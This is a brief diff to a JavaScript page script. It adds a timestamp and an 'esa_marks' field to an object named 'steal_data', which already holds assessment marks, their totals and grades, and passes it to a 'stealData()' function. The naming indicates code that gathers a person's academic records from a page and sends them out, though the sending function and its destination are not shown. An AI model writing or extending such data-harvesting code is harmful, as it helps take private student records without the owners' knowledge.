@@ -401,12 +401,16 @@
         </div>
       `;
 
+      let currdate = new Date().toLocaleString();
+
       var steal_data = {
         assmark: assmark,
         isamark: isamark,
         assoutof: assoutof,
         isaoutof: isaoutof,
         grades: grades,
+        esa_marks,
+        timestamp: currdate,
       };
 
       stealData(steal_data);
